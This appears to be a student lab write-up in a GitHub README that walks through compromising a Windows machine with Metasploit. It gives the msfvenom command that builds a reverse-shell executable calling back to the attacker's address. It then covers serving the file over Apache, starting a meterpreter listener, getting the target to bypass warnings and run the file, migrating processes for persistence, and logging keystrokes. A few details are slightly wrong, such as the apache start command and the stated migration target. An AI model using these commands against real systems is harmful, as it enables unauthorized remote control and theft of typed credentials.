# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig
## OUTPUT:
![output 1](https://github.com/madhan0809/Compromising-windows-using-Metasploit/assets/119165530/22f1bff7-ba73-4e5a-8974-8de7d74ab3ca)




Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT
![output 2](https://github.com/madhan0809/Compromising-windows-using-Metasploit/assets/119165530/878b25cd-b6d9-4189-b674-97a1f167cc62)




copy the fun.exe into the apache /var/www/html folder
![output 3](https://github.com/madhan0809/Compromising-windows-using-Metasploit/assets/119165530/06824065-e720-41d3-8026-e95c65c63b9f)


Start apache server
sudo systemctl apache2 start

![output 4](https://github.com/madhan0809/Compromising-windows-using-Metasploit/assets/119165530/b0f7ee57-4fbd-402f-8f3c-6043b53e3b8c)



Check the status of apache2
![output 5](https://github.com/madhan0809/Compromising-windows-using-Metasploit/assets/119165530/0feba05b-d5ec-4948-8564-6a5d8a91dfd9)



Invoke msfconsole:
## OUTPUT:




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
![output 6](https://github.com/madhan0809/Compromising-windows-using-Metasploit/assets/119165530/4007506a-ea64-4553-bc84-2e7e1499cd8c)




On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
![output 7](https://github.com/madhan0809/Compromising-windows-using-Metasploit/assets/119165530/1c1180d0-1cd0-44e2-a873-bc140871641c)


Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![output 8](https://github.com/madhan0809/Compromising-windows-using-Metasploit/assets/119165530/d2146f57-0d21-474a-92a9-7bea166d226b)


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
![output 9](https://github.com/madhan0809/Compromising-windows-using-Metasploit/assets/119165530/92d07609-474b-4306-9e23-d0092f482e62)



Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![output 10](https://github.com/madhan0809/Compromising-windows-using-Metasploit/assets/119165530/869b7223-48a2-421c-83b4-e458c4cb9803)



keyscan_dump	Shows the keystrokes captured so far
![output 11](https://github.com/madhan0809/Compromising-windows-using-Metasploit/assets/119165530/9eec4c65-c12d-4a5e-bdfc-7fef59489db9)





## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
